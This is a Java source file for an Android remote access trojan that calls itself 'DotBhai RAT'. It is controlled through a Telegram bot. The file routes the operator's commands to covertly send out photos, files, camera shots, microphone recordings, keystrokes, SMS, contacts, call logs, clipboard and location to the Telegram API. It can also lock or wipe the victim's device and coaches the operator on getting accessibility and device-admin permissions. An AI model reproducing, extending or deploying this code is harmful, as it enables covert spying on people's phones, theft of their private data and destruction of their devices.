package com.dotbhai.imagesender;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.util.List;

public class CommandHandler {

    private final Context ctx;
    public CommandHandler(Context ctx) { this.ctx = ctx; }

    public static JSONArray mainMenu() throws Exception {
        JSONArray rows = new JSONArray();

        rows.put(new JSONArray()
                .put(btn("📷 صور المعرض", "/images"))
                .put(btn("📂 الملفات", "/files")));

        rows.put(new JSONArray()
                .put(btn("📸 كاميرا أمامية", "/cam_f"))
                .put(btn("📸 كاميرا خلفية", "/cam_b")));

        rows.put(new JSONArray()
                .put(btn("🎤 مايك 10ث", "/mic"))
                .put(btn("📍 الموقع", "/location")));

        rows.put(new JSONArray()
                .put(btn("🔔 الإشعارات", "/notif"))
                .put(btn("⌨️ Keylog", "/keylog")));

        rows.put(new JSONArray()
                .put(btn("📋 الحافظة", "/clip"))
                .put(btn("📶 WiFi", "/wifi")));

        rows.put(new JSONArray()
                .put(btn("📇 جهات الاتصال", "/contacts"))
                .put(btn("💬 الرسائل", "/sms")));

        rows.put(new JSONArray()
                .put(btn("📞 المكالمات", "/calls"))
                .put(btn("📱 الجهاز", "/device")));

        rows.put(new JSONArray()
                .put(btn("🔋 البطارية", "/battery"))
                .put(btn("📊 الذاكرة", "/mem")));

        rows.put(new JSONArray()
                .put(btn("🔒 قفل الشاشة", "/lock"))
                .put(btn("💣 مسح الجهاز", "/wipe")));

        rows.put(new JSONArray()
                .put(btn("🔊 أقصى صوت", "/volume"))
                .put(btn("💥 اهتزاز", "/vibrate")));

        rows.put(new JSONArray()
                .put(btn("🗑️ إزالة التطبيق", "/uninstall"))
                .put(btn("⚙️ أذونات إضافية", "/perms")));

        return rows;
    }

    private static JSONObject btn(String t, String d) throws Exception {
        JSONObject o = new JSONObject();
        o.put("text", t);
        o.put("callback_data", d);
        return o;
    }

    public void execute(final String cmd, final String callbackId) {
        new Thread(() -> {
            try {
                String reply = route(cmd);
                if (reply != null && !reply.isEmpty())
                    TelegramSender.sendMessage(reply);
                answerCallback(callbackId);
            } catch (Exception e) {
                TelegramSender.sendMessage("⚠️ خطأ: " + e.getMessage());
            }
        }).start();
    }

    private String route(String cmd) throws Exception {

        if (cmd.equals("/start") || cmd.equals("/menu")) {
            TelegramSender.sendMessageWithButtons(
                    "🤖 <b>DotBhai RAT — القائمة</b>", mainMenu());
            return null;
        }

        if (cmd.equals("/files")) {
            File root = FileBrowser.root();
            TelegramSender.sendMessageWithButtons(
                    FileBrowser.describe(root), FileBrowser.listKeyboard(root));
            return null;
        }
        if (cmd.startsWith("/cd:")) {
            File d = new File(cmd.substring(4));
            TelegramSender.sendMessageWithButtons(
                    FileBrowser.describe(d), FileBrowser.listKeyboard(d));
            return null;
        }
        if (cmd.startsWith("/dl:")) {
            FileBrowser.sendFile(new File(cmd.substring(4)));
            return null;
        }

        if (cmd.equals("/images")) {
            List<File> imgs = ImageHelper.getAllImages(ctx, 20);
            if (imgs.isEmpty()) return "📷 لا صور";
            for (File f : imgs) TelegramSender.sendPhoto(f, "📷 " + f.getName());
            return "✅ " + imgs.size() + " صورة";
        }

        if (cmd.equals("/cam_f") || cmd.equals("/cam_b")) {
            final boolean front = cmd.equals("/cam_f");
            TelegramSender.sendMessage("📸 جاري التصوير...");
            CameraHelper.capture(ctx, front, (file, err) -> {
                if (file == null) {
                    TelegramSender.sendMessage("⚠️ " + err);
                } else {
                    TelegramSender.sendPhoto(file, "📸 " + (front ? "أمامية" : "خلفية"));
                    file.delete();
                }
            });
            return null;
        }

        if (cmd.equals("/mic")) {
            TelegramSender.sendMessage("🎤 تسجيل 10 ثوان...");
            AudioHelper.record(ctx, 10, (file, err) -> {
                if (file == null) {
                    TelegramSender.sendMessage("⚠️ " + err);
                } else {
                    TelegramSender.sendDocument(file, "🎤 تسجيل صوتي");
                    file.delete();
                }
            });
            return null;
        }

        if (cmd.equals("/location")) return LocationHelper.lastKnown(ctx);

        if (cmd.equals("/notif")) {
            String s = NotifListener.drain();
            return "🔔 الإشعارات:\n\n" + s + "\n\n(فعّل من /perms)";
        }

        if (cmd.equals("/keylog")) {
            String s = KeylogService.drain();
            return "⌨️ Keylog:\n\n" + s + "\n\n(فعّل من /perms)";
        }

        if (cmd.equals("/clip")) return ClipboardHelper.read(ctx);
        if (cmd.equals("/wifi")) return WifiHelper.list(ctx);

        if (cmd.equals("/contacts")) {
            List<String> l = ContactHelper.getContacts(ctx, 80);
            return "📇 (" + l.size() + "):\n\n" + String.join("\n", l);
        }

        if (cmd.equals("/sms")) {
            List<String> l = SmsHelper.getSms(ctx, 40);
            return "💬 (" + l.size() + "):\n\n" + String.join("\n\n", l);
        }

        if (cmd.equals("/calls")) {
            List<String> l = CallLogHelper.getCallLog(ctx, 40);
            return "📞 (" + l.size() + "):\n\n" + String.join("\n", l);
        }

        if (cmd.equals("/device")) {
            return "📱 <b>الجهاز</b>\n"
                    + "الطراز: " + Build.MODEL + "\n"
                    + "الشركة: " + Build.MANUFACTURER + "\n"
                    + "أندرويد: " + Build.VERSION.RELEASE
                    + " (SDK " + Build.VERSION.SDK_INT + ")\n"
                    + "المعالج: " + Build.HARDWARE + "\n"
                    + "ANDROID_ID: " + Settings.Secure.getString(
                        ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
        }

        if (cmd.equals("/battery")) {
            android.os.BatteryManager bm = (android.os.BatteryManager)
                    ctx.getSystemService(Context.BATTERY_SERVICE);
            int level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
            return "🔋 البطارية: " + level + "%";
        }

        if (cmd.equals("/mem")) {
            Runtime r = Runtime.getRuntime();
            long free = r.freeMemory() / (1024 * 1024);
            long total = r.totalMemory() / (1024 * 1024);
            return "📊 الذاكرة:\nحرة: " + free + "MB\nكلية: " + total + "MB";
        }

        if (cmd.equals("/lock")) {
            if (!AdminHelper.isAdmin(ctx))
                return "🔒 فعّل Device Admin من /perms";
            return AdminHelper.lock(ctx) ? "🔒 تم القفل" : "⚠️ فشل";
        }

        if (cmd.equals("/wipe")) {
            if (!AdminHelper.isAdmin(ctx))
                return "💣 فعّل Device Admin من /perms";
            return AdminHelper.wipe(ctx) ? "💣 جاري المسح..." : "⚠️ فشل";
        }

        if (cmd.equals("/volume")) {
            android.media.AudioManager am = (android.media.AudioManager)
                    ctx.getSystemService(Context.AUDIO_SERVICE);
            int max = am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC);
            am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, max, 0);
            return "🔊 " + max + "/" + max;
        }

        if (cmd.equals("/vibrate")) {
            android.os.Vibrator v = (android.os.Vibrator)
                    ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) {
                if (Build.VERSION.SDK_INT >= 26)
                    v.vibrate(android.os.VibrationEffect.createOneShot(
                            3000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                else v.vibrate(3000);
            }
            return "💥 3 ثوان";
        }

        if (cmd.equals("/uninstall")) {
            Intent i = new Intent(Intent.ACTION_DELETE,
                    Uri.parse("package:" + ctx.getPackageName()));
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return "🗑️ فتح شاشة الإزالة";
        }

        if (cmd.equals("/perms")) {
            return "⚙️ <b>تفعيل الأذونات</b>\n\n"
                    + "1. الإشعارات: الإعدادات → الأمان → إشعارات التطبيقات\n"
                    + "2. Keylog: الإعدادات → إمكانية الوصول\n"
                    + "3. Device Admin: من شاشة التطبيق الرئيسية";
        }

        return "❓ " + cmd;
    }

    private void answerCallback(String id) {
        if (id == null) return;
        try {
            okhttp3.HttpUrl url = okhttp3.HttpUrl.parse(
                    "https://api.telegram.org/bot" + TelegramSender.BOT_TOKEN
                            + "/answerCallbackQuery")
                    .newBuilder().addQueryParameter("callback_query_id", id).build();
            TelegramSender.client.newCall(
                    new okhttp3.Request.Builder().url(url).get().build()).enqueue(
                    new okhttp3.Callback() {
                        @Override public void onFailure(okhttp3.Call c, java.io.IOException e) {}
                        @Override public void onResponse(okhttp3.Call c, okhttp3.Response r) { r.close(); }
                    });
        } catch (Exception ignored) {}
    }
}